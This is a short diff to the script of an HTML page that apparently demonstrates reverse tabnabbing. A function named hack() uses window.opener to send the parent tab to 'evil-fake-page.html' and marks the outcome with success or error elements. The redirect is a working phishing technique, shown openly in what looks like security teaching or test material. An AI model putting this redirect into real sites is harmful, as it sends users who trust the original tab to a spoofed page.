@@ -14,13 +14,23 @@
 </body>
 
 <script>
-	var selector = ".success";
-	if (window.opener) {
-		window.opener.location.href = "evil-fake-page.html";
-		selector = ".error";
-	}
-	document.querySelector(selector).style.display = "block";
+var selector = ".success";
 
+function hack() {
+    try {
+        if (window.opener) {
+            window.opener.location.href = "evil-fake-page.html";
+            selector = ".error";
+            return true;
+        }
+    } catch (e) {
+        return false;
+    }
+}
+
+if (!hack()) {
+    document.querySelector(selector).style.display = "block";
+}
 </script>
 
 </html>
